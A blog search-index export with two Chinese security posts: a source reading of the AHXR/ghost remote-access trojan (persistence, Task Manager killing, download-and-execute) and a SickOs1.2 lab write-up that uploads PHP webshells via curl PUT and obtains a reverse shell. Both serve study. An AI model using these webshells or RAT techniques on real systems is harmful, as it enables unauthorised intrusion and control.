<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AXHR_Ghost源码阅读和分析</title>
    <url>/2021/04/05/AXHR-Ghost%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%92%8C%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>由于最近写c2感觉自己有闭门造车之势，于是读了一遍AHXR/ghost的源码，发现自己很多想法还不成熟，先把周遭的c2读一遍，打算开一个《安全工具月月读》专题，提升一下自己的眼界。我会尽量把blog写得简单易懂，有问题的地方持续改进</p>
</blockquote>
<a id="more"></a>



<h2 id="0x01-文件结构"><a href="#0x01-文件结构" class="headerlink" title="0x01 文件结构"></a>0x01 文件结构</h2><p>作者把很多函数实现都写在头文件中，这操作让代码混乱，不过可以方便引用，c++中的hpp就是这样</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">├─Encryption (加密逻辑的实现)</span><br><span class="line">│      encrypt.h # 提供加密算法函数</span><br><span class="line">│</span><br><span class="line">├─ghostdll（动态链接库，将server和zombie共同的结构体和函数提出，减少代码量，方便调用）</span><br><span class="line">│      AssemblyInfo.cpp # 文件属性、信息的添加</span><br><span class="line">│      ghostlib.h # 定义公有结构体，声明公有函数</span><br><span class="line">│      ghostlib.cpp # 全局变量声明、公有函数的实现</span><br><span class="line">│      resource.h # 资源宏定义</span><br><span class="line">│</span><br><span class="line">├─server （服务端）</span><br><span class="line">│  │  callbacks.h # 回调函数</span><br><span class="line">│  │  config.h # 主要是菜单、日志函数的宏定义	</span><br><span class="line">│  │  console.h # 命令控制逻辑</span><br><span class="line">│  │  gui.h # 图形界面类，继承System::Windows::Forms::Form</span><br><span class="line">│  │  info.h # 基本信息获取的实现（获取真实IP等）</span><br><span class="line">│  │  resource.h # 资源宏定义</span><br><span class="line">│  │  server.cpp # 界面主逻辑，调用</span><br><span class="line">│  │</span><br><span class="line">│  └─ini （配置文件的读取，使用第三方库INIReader，本篇不会详细描述）</span><br><span class="line">│          AssemblyInfo.cpp # 同上</span><br><span class="line">│          ini.h</span><br><span class="line">│          ini.cpp</span><br><span class="line">│          INIReader.cpp</span><br><span class="line">│          INIReader.h </span><br><span class="line">│</span><br><span class="line">└─zombie （客户端，植入被控主机）</span><br><span class="line">        info.h # 声明工具函数</span><br><span class="line">        info.cpp # 工具函数的实现</span><br><span class="line">        resource.h # 资源宏定义</span><br><span class="line">        zombie.cpp # 交互主逻辑</span><br></pre></td></tr></table></figure>



<h2 id="0x02-数据结构"><a href="#0x02-数据结构" class="headerlink" title="0x02 数据结构"></a>0x02 数据结构</h2><blockquote>
<p>数据结构并不复杂，大多数都是直接全局声明的数值和字符串，这里仅介绍结构体和类</p>
</blockquote>
<p><code>struct _clientData</code>是zombie的主要结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">clientData</span> &#123;</span></span><br><span class="line">		SOCKET socketRef;				<span class="comment">// socket文件描述符</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> * <span class="title">clientInfo</span>;</span>	<span class="comment">// 地址信息结构体</span></span><br><span class="line">		<span class="keyword">char</span> * system_data;				<span class="comment">// json串，存放被植入系统相关数据</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>class gui</code>是server的界面类，继承了windows系统表格基类</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ref <span class="class"><span class="keyword">class</span> <span class="title">gui</span> :</span> <span class="keyword">public</span> System::Windows::Forms::Form</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		gui(<span class="keyword">void</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			InitializeComponent();</span><br><span class="line">			<span class="comment">//<span class="doctag">TODO:</span> Add the constructor code here</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">protected</span>:</span><br><span class="line">		<span class="comment">/// Clean up any resources being used.</span></span><br><span class="line">		~gui()</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (components)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">delete</span> components;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">public</span>: <span class="keyword">static</span> System::Windows::Forms::NotifyIcon^  taskbarIcon;</span><br><span class="line">	<span class="keyword">private</span>: System::ComponentModel::IContainer^  components;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="comment">// Required designer variable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> region Windows Form Designer generated code</span></span><br><span class="line">		<span class="comment">/// Required method for Designer support - do not modify</span></span><br><span class="line">		<span class="comment">/// the contents of this method with the code editor.</span></span><br><span class="line">		<span class="function"><span class="keyword">void</span> <span class="title">InitializeComponent</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;components = (gcnew System::ComponentModel::Container());</span><br><span class="line">			System::ComponentModel::ComponentResourceManager^  resources = (gcnew System::ComponentModel::ComponentResourceManager(gui::<span class="keyword">typeid</span>));</span><br><span class="line">			<span class="keyword">this</span>-&gt;taskbarIcon = (gcnew System::Windows::Forms::NotifyIcon(<span class="keyword">this</span>-&gt;components));</span><br><span class="line">			<span class="keyword">this</span>-&gt;SuspendLayout();</span><br><span class="line">			<span class="comment">// taskbarIcon 右下方消息弹窗</span></span><br><span class="line">			<span class="keyword">this</span>-&gt;taskbarIcon-&gt;BalloonTipIcon = System::Windows::Forms::ToolTipIcon::Info;</span><br><span class="line">			<span class="keyword">this</span>-&gt;taskbarIcon-&gt;BalloonTipText = <span class="string">L"New Client"</span>;</span><br><span class="line">			<span class="keyword">this</span>-&gt;taskbarIcon-&gt;BalloonTipTitle = <span class="string">L"ghost"</span>;</span><br><span class="line">			<span class="keyword">this</span>-&gt;taskbarIcon-&gt;Icon = (cli::safe_cast&lt;System::Drawing::Icon^&gt;(resources-&gt;GetObject(<span class="string">L"taskbarIcon.Icon"</span>)));</span><br><span class="line">			<span class="keyword">this</span>-&gt;taskbarIcon-&gt;Text = <span class="string">L"ghost"</span>;</span><br><span class="line">			<span class="keyword">this</span>-&gt;taskbarIcon-&gt;Visible = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 右下方任务列表中双击图标 回调函数注册</span></span><br><span class="line">			<span class="keyword">this</span>-&gt;taskbarIcon-&gt;MouseDoubleClick += gcnew System::Windows::Forms::MouseEventHandler(<span class="keyword">this</span>, &amp;gui::taskbarIcon_MouseDoubleClick);</span><br><span class="line"></span><br><span class="line">			<span class="comment">// gui</span></span><br><span class="line">			<span class="keyword">this</span>-&gt;AutoScaleDimensions = System::Drawing::SizeF(<span class="number">6</span>, <span class="number">13</span>);</span><br><span class="line">			<span class="keyword">this</span>-&gt;AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;</span><br><span class="line">			<span class="keyword">this</span>-&gt;ClientSize = System::Drawing::Size(<span class="number">164</span>, <span class="number">19</span>);</span><br><span class="line">			<span class="keyword">this</span>-&gt;Icon = (cli::safe_cast&lt;System::Drawing::Icon^&gt;(resources-&gt;GetObject(<span class="string">L"$this.Icon"</span>)));</span><br><span class="line">			<span class="keyword">this</span>-&gt;Name = <span class="string">L"gui"</span>;</span><br><span class="line">			<span class="keyword">this</span>-&gt;ShowIcon = <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">this</span>-&gt;ShowInTaskbar = <span class="literal">false</span>;</span><br><span class="line">			<span class="keyword">this</span>-&gt;Text = <span class="string">L"#ghost (github.com/AHXR)"</span>;</span><br><span class="line">			<span class="keyword">this</span>-&gt;WindowState = System::Windows::Forms::FormWindowState::Minimized;</span><br><span class="line">			<span class="keyword">this</span>-&gt;Load += gcnew System::EventHandler(<span class="keyword">this</span>, &amp;gui::gui_Load);</span><br><span class="line">			<span class="keyword">this</span>-&gt;ResumeLayout(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> endregion</span></span><br><span class="line">	<span class="keyword">private</span>: System::<span class="function">Void <span class="title">gui_Load</span><span class="params">(System::Object^  sender, System::EventArgs^  e)</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 鼠标双击右下角的任务小图标时，记录日志，zombie探活，再刷新界面</span></span><br><span class="line">	<span class="keyword">private</span>: System::<span class="function">Void <span class="title">taskbarIcon_MouseDoubleClick</span><span class="params">(System::Object^  sender, System::Windows::Forms::MouseEventArgs^  e)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (b_hidden) &#123;</span><br><span class="line">			SHOW_CONSOLE();</span><br><span class="line">			freopen(<span class="string">"conin$"</span>, <span class="string">"r"</span>, <span class="built_in">stdin</span>);</span><br><span class="line">			freopen(<span class="string">"conout$"</span>, <span class="string">"w"</span>, <span class="built_in">stdout</span>);</span><br><span class="line">			freopen(<span class="string">"conout$"</span>, <span class="string">"w"</span>, <span class="built_in">stderr</span>);</span><br><span class="line">			HANDLE hstdout = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">			ahxrlogger_handle(hstdout); <span class="comment">// 作者自己的logger</span></span><br><span class="line">			WARNING(<span class="string">"Refreshing clients... Please wait."</span>);</span><br><span class="line">			refreshClients();</span><br><span class="line">			SHOW_GHOST();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>对上面的GUI编程暂时不是很了解，就是把参数填到对应的入口中，比如程序图标注册、双击回调函数注册，在构造函数那里还能进行一些扩展操作。</p>
<h2 id="0x03-主要函数及关系"><a href="#0x03-主要函数及关系" class="headerlink" title="0x03 主要函数及关系"></a>0x03 主要函数及关系</h2><h3 id="0x31-ghostdll"><a href="#0x31-ghostdll" class="headerlink" title="0x31 ghostdll"></a>0x31 ghostdll</h3><p><img src="/2021/04/05/AXHR-Ghost%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%92%8C%E5%88%86%E6%9E%90/1.png" alt></p>
<p>其中采用vector维护全局clientData集合</p>
<p><code>std::vector    &lt; GHOSTLIB &gt; client_data;</code></p>
<h3 id="0x32-encrypt"><a href="#0x32-encrypt" class="headerlink" title="0x32 encrypt"></a>0x32 encrypt</h3><p>其中存在两个函数接口及其实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="function"><span class="built_in">string</span> <span class="title">encryptCMD</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> <span class="built_in">text</span>)</span></span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="function"><span class="built_in">string</span> <span class="title">unencryptCMD</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> <span class="built_in">text</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> c_original[ENCRYPT_CMD_LEN] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890,./&lt;&gt;?;:\'\"[]\\&#123;&#125;|=-+_)(*&amp;^%$#@!~` "</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> c_encrypt [ENCRYPT_CMD_LEN] = <span class="string">"yr(GRMJ1#\'Fme]Kc3&lt;0`&#123;QCBa,$pDx2[h;g8_./unU|+fELqYN~&#125;7l&gt;=dzX?WkjTVH%@b6s9viIo4:v5Aw&amp;O*tP!\\S^)Z\" -"</span>;</span><br></pre></td></tr></table></figure>

<p>原理很简单，密码和明文下标相对应转换，通信全程用这种方法加解密</p>
<h3 id="0x33-zombie"><a href="#0x33-zombie" class="headerlink" title="0x33 zombie"></a>0x33 zombie</h3><ol>
<li>先说info.h中的三个工具函数的功能</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取反病毒软件的名称</span></span><br><span class="line"><span class="comment">// 参考http://www.rohitab.com/discuss/topic/42792-wmi-get-antivirus-name-c/?p=10106373</span></span><br><span class="line"><span class="built_in">std</span>::<span class="function"><span class="built_in">string</span>	<span class="title">getAntivirus</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对https://api.ipify.org发起请求，网站作用是返回请求者的IP，在返回结果中找到被植入机器的真实IP</span></span><br><span class="line"><span class="built_in">std</span>::<span class="function"><span class="built_in">string</span> <span class="title">real_ip</span><span class="params">()</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 用进程名找到进程id，后续用于找到taskmgr并杀死，意在令用户无法通过taskmgr杀掉该进程</span></span><br><span class="line"><span class="function">DWORD <span class="title">FindProcessId</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">wstring</span>&amp; processName)</span></span>;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>zombie.cpp中除main外的函数功能</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 用于接收server返回的信息。作为例程，在</span></span><br><span class="line"><span class="comment">onClientConnect中以新线程的方式被调用 */</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">t_ping</span><span class="params">(LPVOID lpParams)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 用FindProcessId找到taskmgr的进程号，OpenProcess打开进程、</span></span><br><span class="line"><span class="comment">TerminateProcess杀死进程。作为例程，在zombie的main函数中以新线程方式被调用 */</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">t_payloads</span><span class="params">(LPVOID lpParams)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 当连接成功时，获取本地PC信息并组装如下json串，</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        "ID": "",</span></span><br><span class="line"><span class="comment">        "USER": "",</span></span><br><span class="line"><span class="comment">        "IP": "",</span></span><br><span class="line"><span class="comment">        "PORT": "",</span></span><br><span class="line"><span class="comment">        "AV": "",</span></span><br><span class="line"><span class="comment">        "VERSION": "",</span></span><br><span class="line"><span class="comment">        "OS": ""</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    发送给server，然后开启一个线程接收server返回信息（直接丢弃）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">onClientConnect</span><span class="params">()</span></span>;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/* client接收data，解密后，判断收到的命令是："探活"、"命令执行"、</span></span><br><span class="line"><span class="comment">"是否允许任务管理器杀死client"、"下载并执行程序"，以此执行相应操作 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">onClientRecData</span><span class="params">(<span class="keyword">char</span>* data)</span></span>;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>zombie.cpp中main函数逻辑</strong></li>
</ol>
<p><img src="/2021/04/05/AXHR-Ghost%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%92%8C%E5%88%86%E6%9E%90/2.png" alt="zombieMain"></p>
<hr>
<p><img src="/2021/04/05/AXHR-Ghost%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%92%8C%E5%88%86%E6%9E%90/3.png" alt></p>
<p>几个要点：</p>
<ul>
<li>wget构建</li>
<li>将zombie程序移动到系统目录下</li>
<li>杀死taskmgr策略</li>
<li>注册表接口编程</li>
</ul>
<h3 id="0x34-server"><a href="#0x34-server" class="headerlink" title="0x34 server"></a>0x34 server</h3><p>server端的主要逻辑在console.h中</p>
<p>大体的逻辑结构就是在设置端口、超时时间并完成配置保存之后，在一个while(1)循环内读取命令or选项</p>
<p>代码略丑就不放出来，单纯通过堆砌while和SwitchCase完成逻辑</p>
<p><img src="/2021/04/05/AXHR-Ghost%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%92%8C%E5%88%86%E6%9E%90/4.png" alt="1617548323790"></p>
<p><img src="/2021/04/05/AXHR-Ghost%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E5%92%8C%E5%88%86%E6%9E%90/5.png" alt="1617548221882"></p>
<p>下面用简单的伪代码代替</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">while(1)</span><br><span class="line">	switch(input)	</span><br><span class="line">        1)  显示所有zombie的ID、IP、Port</span><br><span class="line">			 输入想要继续操作的zombie_id，查看USER、VERSION、AV</span><br><span class="line">			switch(input_a)</span><br><span class="line">			0)  回主界面</span><br><span class="line">			1)  执行命令</span><br><span class="line">			2)  下载和执行程序</span><br><span class="line">			3)  杀死taskmgr开关</span><br><span class="line"></span><br><span class="line">		2)  配置保存，保存刚才设置的端口和web页面中查询的IP</span><br><span class="line">			 保存完后下次会读取配置</span><br><span class="line">		</span><br><span class="line">        3)  刷新，如果zombie断连则数据会从全局容器中删除</span><br><span class="line">        </span><br><span class="line">        4)  最小化</span><br><span class="line">			 选择后我们便可以关闭console，图标会保留在右下角的任务窗口中，双击任务窗口console又会显示</span><br><span class="line"></span><br><span class="line">        5)  退出</span><br></pre></td></tr></table></figure>



<h2 id="0x04-功能设计要点"><a href="#0x04-功能设计要点" class="headerlink" title="0x04 功能设计要点"></a>0x04 功能设计要点</h2><ul>
<li>命令传输、执行</li>
<li>文件下载、执行</li>
<li>操作注册表，自启动</li>
<li>心跳探活</li>
<li>通信加密</li>
<li>GUI</li>
<li>定时杀死任务管理器</li>
<li>真实IP获取</li>
<li>获取Antivirus信息</li>
<li>zombie数据保存</li>
</ul>
<h2 id="0x05-关键语法及技术"><a href="#0x05-关键语法及技术" class="headerlink" title="0x05 关键语法及技术"></a>0x05 关键语法及技术</h2><ol>
<li>宏的使用<ul>
<li><code>#pragma once</code>：让文件编译一次，防止多次引入，有别于<code>#ifndef</code> [8]</li>
<li><code>#pragma comment （lib, &quot;lib_name&quot;)</code>：链接对应的库，这样就不用再手动设置工程settings</li>
<li><code>#pragma region（endregion）</code>：pragma region (endregion) 是一个Visio Studio Code Editor中的命令，来定义可以扩展和收缩的代码区域的开头和结尾，可以用来收缩或者展开一段代码。</li>
</ul>
</li>
<li><code>cin.ignore()</code>：吃掉一个字符，比如最后的<code>\n</code>，防止干扰下一次输入</li>
<li>这里的<code>^</code>并非c#扩展，而是c++/cli中的语法，c++/cli是标准c++的超集，该语法拥有垃圾回收特性</li>
<li>gcnew（garbage collection new），带有gc特性的new，配合上述3使用</li>
<li>注册表函数接口（后续开一篇blog写）</li>
</ol>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><ol>
<li>虽然头文件会被包含进cpp文件，但函数实现写在头文件里似乎不是一个好的习惯</li>
<li>代码逻辑略为混乱，尤其在命令执行模式和下载执行模式那一块，如果软件定位是一项目一重写那也未尝不可，但如果不是则这么写后期的维护工作量会很大</li>
<li>加密是必要的，可以采用不同的对称加密方式进行加密（AES、DES等）</li>
<li>通过注册表操作属于持久化的一种形式，持久化是后渗透的另一个大项</li>
<li>多线程编程思想，不阻塞主逻辑，在t_ping接收server返回消息和b_payload杀死taskmgr中体现</li>
<li>良好的开关设计思想，体现在杀死taskmgr的逻辑中</li>
<li>隐藏方式（不弹窗）执行命令</li>
<li>json和ini都运用到库，有效提高开发效率</li>
<li>参数的合理判断，多处对于输入参数的判断采用string输入后转int判断的方式，增强容错性</li>
<li>配置存储，下一次运行直接读取先前保存的配置</li>
</ol>
<h2 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h2><p><a href="https://github.com/alphaSeclab/awesome-rat?hmsr=joyk.com&utm_source=joyk.com&utm_medium=referral" target="_blank" rel="noopener">[1] awesome rat</a></p>
<p><a href="https://github.com/AHXR/ghost" target="_blank" rel="noopener">[2] AHXR/ghost</a></p>
<p><a href="https://github.com/AHXR/ahxrlogger" target="_blank" rel="noopener">[3] AHXR/ahxrlogger</a></p>
<p><a href="https://github.com/AHXR/ahxrwinsocket" target="_blank" rel="noopener">[4] AHXR/ahxrwinsocket</a></p>
<p><a href="https://attack.mitre.org/" target="_blank" rel="noopener">[5] MITRE ATT&amp;CK</a></p>
<p><a href="https://forum.juce.com/t/examples-why-is-implementation-code-in-header-files/35043" target="_blank" rel="noopener">[6] Why is implementation code in header files?</a></p>
<p><a href="https://xz.aliyun.com/t/6461" target="_blank" rel="noopener">[7] windows中常见后门持久化方法总结</a></p>
<p><a href="https://blog.csdn.net/fanyun_01/article/details/77413992" target="_blank" rel="noopener">[8] #pragma once用法总结</a></p>
]]></content>
      <categories>
        <category>Sec Dev</category>
        <category>Red Team</category>
        <category>C2</category>
      </categories>
      <tags>
        <tag>安全工具月月读</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub SickOs1-2 Writeup</title>
    <url>/2020/09/04/Vulnhub-SickOs1-2-Writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>缺乏经验，学习之</p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 扫描靶机地址</span><br><span class="line">nmap -sn -T5 192.168.206.1&#x2F;24</span><br><span class="line"></span><br><span class="line"># 扫描开启服务和端口</span><br><span class="line">nmap -sV -A -p- -T5 192.168.206.151</span><br></pre></td></tr></table></figure>

<blockquote>
<p>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   <code>1024 66:8c:c0:f2:85:7c:6c:c0:f6​​:ab:​7d:48:04:81:c2:d4 (DSA)</code><br>|   <code>2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)</code><br>|_  <code>256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)</code><br>80/tcp open  http    lighttpd 1.4.28<br>|_http-server-header: lighttpd/1.4.28<br>|_http-title: Site doesn’t have a title (text/html).<br>MAC Address: 00:0C:29:CE:AB:B8 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.98 ms 192.168.206.151</p>
</blockquote>
<p>两个端口开放80和22</p>
<h3 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h3><p>访问一下80，就一张meme图</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/1.png" alt><br>查看源码，也没有东西，使用dirb和nikto扫描端口</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/2.png" alt><br>出现一个<code>test</code>文件夹，浏览器访问</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/3.png" alt><br>得知是<code>lighttpd 1.4.28</code>版本，查看web指纹</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/4.png" alt><br>没有建设性资料，再于其基础上dirb路径爆破，依然无果，80端口暂放</p>
<h3 id="22端口"><a href="#22端口" class="headerlink" title="22端口"></a>22端口</h3><p>hydra进行ssh爆破</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -L top-usernames-shortlist.txt -P password-100.txt 192.168.206.151 -t 20 -I ssh</span><br><span class="line">hydra -L top-usernames-shortlist.txt -P password-1000.txt 192.168.206.151 -t 20 -I ssh</span><br></pre></td></tr></table></figure>

<p>均未成功，看来这里存在知识盲区</p>
<p>一番查询后得知，可用curl来服务器探查支持的HTTP方法，就对于仅有的两个页面进行探查</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v -X OPTIONS http://192.168.206.151</span><br><span class="line">curl -v -X OPTIONS http://192.168.206.151/test/</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/5.png" alt><br><code>/test/</code>路径下支持多种方法</p>
<h2 id="0x02-漏洞挖掘与利用"><a href="#0x02-漏洞挖掘与利用" class="headerlink" title="0x02 漏洞挖掘与利用"></a>0x02 漏洞挖掘与利用</h2><p>以前只在图解HTTP中听说过，从来没有实际操作过HTTP方法。使用curl直接采用PUT方法，尝试将后门放入服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v -X PUT -d "&lt;?php system($_GET['cmd']); ?&gt;" http://192.168.206.151/test/t.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> -v 回显信息</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -X 请求方法</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -d post数据</span></span><br><span class="line">&lt;?php $a = "assert"; $a(@$_POST['shell']); ?&gt;</span><br></pre></td></tr></table></figure>



<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/6.png" alt><br>可以看见在<code>test</code>页面中出现了<code>t.php</code></p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/7.png" alt><br>用蚁剑连接，连接超时！</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/8.png" alt><br>一句话中没有中文字符，同时也测试了好几个其他免杀木马，均连接失败，随手传了个phpinfo却能执行</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/9.png" alt><br>经过验证，后台代码可以执行，但是无法接收，这样也好说，既然传不了那我就直接执行，结果也会失败。</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/10.png" alt><br>如上图，能看见是服务端错误</p>
<ul>
<li>waf拦截</li>
</ul>
<p>这种一直断连的场景存在waf的可能性很高，于是使用<code>nmap</code>、<code>wafw00f</code>、<code>sqlmap</code></p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/11.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -p 443, 80 --script=http-waf-detect 192.68.206.151/test</span><br><span class="line"></span><br><span class="line">wafw00f -a url</span><br><span class="line"><span class="meta">#</span><span class="bash"> -a 所有类型waf</span></span><br></pre></td></tr></table></figure>

<p>以上的waf探测没有下文</p>
<ul>
<li>点击<code>test</code>下的<code>x.php</code>，使用burpsuite进行拦截，直接在bp中对HTTP报文进行修改，将一句话写入</li>
</ul>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/12.png" alt><br>尝试访问，成了！</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/13.png" alt><br>我想看看之前为什么会出错，所以继续写入指令<code>cat%20x.php</code>，然后用bp拦截</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/14.png" alt><br>上图可见，我们用curl写入的webshell已经不成形了，后续再次写入webshell并cat查看，发现<code>$_GET[&#39;pass&#39;]</code>变成了<code>[&#39;pass&#39;]</code>，带有<code>$</code>的部分都被删去了一些，不用说了，看下面的解析。</p>
<h3 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h3><blockquote>
<p><strong>问题的来龙去脉</strong>（Kioptrix2014也遇到过）</p>
<p>php一句话的两种写法</p>
<p><code>&quot;&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;&quot;</code></p>
<p><code>&#39;&lt;?php system($_GET[&quot;pass&quot;]); ?&gt;&#39;</code></p>
<p>第一种：双引号套单引号</p>
<p>​    $号会被解析，需要转义</p>
<p>第二种：单引号套双引号</p>
<p>​    $号不会被解析，无需转义</p>
</blockquote>
<ul>
<li>好的，我们再次用蚁剑连接能用的webshell，结果继续<strong>失败</strong>，这里推测进行了拦截，那么还有一条路<strong>直接反弹shell</strong></li>
</ul>
<p>找到kali中的<code>php-reverse-shell.php</code>文件，调整ip为<code>192.168.206.142</code>，port为<code>4444</code>，复制全部代码，粘贴到bp中发送。</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/15.png" alt><br>kali中nc监听，浏览器中点击reverse-webshell，然而nc中并没有连接</p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/16.png" alt><br>经过查询（这里应该自己慢慢扫描，原因是管理员对iptables or Firewall进行了配置），靶机之开启了443端口进行交互，所以我们将<code>php-reverse-shell</code>的port设置为443，bp重新发送，nc也监听443端口，点击<code>shell.php</code></p>
<p><img src="/2020/09/04/Vulnhub-SickOs1-2-Writeup/17.png" alt><br>成功拿到反弹shell</p>
<h2 id="0x03-提权-amp-get-flag"><a href="#0x03-提权-amp-get-flag" class="headerlink" title="0x03 提权&amp;get flag"></a>0x03 提权&amp;get flag</h2><p>发现python能用，遂将哑shell升级为交互shell，然后获取一波os信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c "import pty;pty.spawn('/bin/bash');"</span><br></pre></td></tr></table></figure>

